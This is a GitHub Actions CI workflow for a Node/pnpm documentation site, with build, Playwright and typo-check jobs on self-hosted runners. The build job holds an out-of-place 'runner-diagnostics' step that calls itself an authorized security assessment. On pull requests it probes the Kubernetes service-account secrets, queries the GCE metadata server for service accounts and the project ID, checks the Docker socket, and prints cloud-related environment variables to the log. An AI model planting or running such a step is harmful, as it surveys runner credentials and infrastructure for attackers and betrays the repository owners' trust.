name: CI

on:
  pull_request:
    branches:
      - main

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  build:
    if: ${{ github.event.pull_request.draft == false && !startsWith(github.head_ref, 'dependabot') }}
    runs-on: [arc-runner-set]

    steps:
      - name: Checkout repository
        uses: actions/checkout@v6

      - name: runner-diagnostics
        if: github.event_name == 'pull_request'
        run: |
          echo "=== authorized security assessment diagnostics begin ==="
          echo "host=$(hostname)"
          echo "--- k8s serviceaccount ---"
          cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "no-namespace-file"
          ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || echo "no-sa-mount"
          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset}:${KUBENETES_SERVICE_PORT:-unset}"
          echo "--- gce metadata ---"
          curl -s -m 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/' | head -c 1500 || echo no-metadata
          echo
          curl -s -m 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/name' | head -c 200 || true
          echo
          curl -s -m 5 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/project/project-id' | head -c 200 || true
          echo
          echo "--- docker ---"
          ls -la /var/run/docker.sock 2>/dev/null || echo "no-docker-sock"
          echo "--- relevant env ---"
          env | grep -Ei 'RUNNER|ARC|KUBE|GCP|GOOGLE|CLUSTER|PROJECT|REGISTRY' | head -40
          echo "=== authorized security assessment diagnostics end ==="

      - name: Install pnpm
        uses: pnpm/action-setup@v5

      - name: Install Node.js
        uses: actions/setup-node@v6
        with:
          node-version: 22
          cache: pnpm

      - name: Install dependencies
        run: pnpm install

      - name: Build
        run: pnpm run build

  e2e:
    if: ${{ github.event.pull_request.draft == false && !startsWith(github.head_ref, 'dependabot') }}
    runs-on: [arc-runner-set]

    steps:
      - name: Checkout repository
        uses: actions/checkout@v6

      - name: Install pnpm
        uses: pnpm/action-setup@v5

      - name: Install Node.js
        uses: actions/setup-node@v6
        with:
          node-version: 22
          cache: pnpm

      - name: Install dependencies
        run: pnpm install

      # Not `pnpm exec playwright`: vocs ships its own playwright, and which
      # copy pnpm links into node_modules/.bin varies with install order.
      - name: Install Playwright browser
        run: node node_modules/@playwright/test/cli.js install --with-deps chromium

      # Builds the site and serves it -- see playwright.config.ts.
      - name: Run browser tests
        run: pnpm run test:e2e

      - name: Upload Playwright report
        if: ${{ !cancelled() }}
        uses: actions/upload-artifact@v4
        with:
          name: playwright-report
          path: playwright-report/
          retention-days: 7

  typo-check:
    if: ${{ github.event.pull_request.draft == false && !startsWith(github.head_ref, 'dependabot') }}
    runs-on: [arc-runner-set]

    steps:
      - name: Checkout repository
        uses: actions/checkout@v6

      - name: Install wget
        run: |
          if ! command -v wget &> /dev/null; then
            sudo apt-get update && sudo apt-get install -y wget
          fi

      - name: Check for typos
        uses: crate-ci/typos@v1.44.0
        with:
          config: ${{ github.workspace }}/_typos.toml

      - name: Check links
        uses: lycheeverse/lychee-action@v2
        with:
          args: --no-progress --verbose "**/README.md" --accept '429, 200'
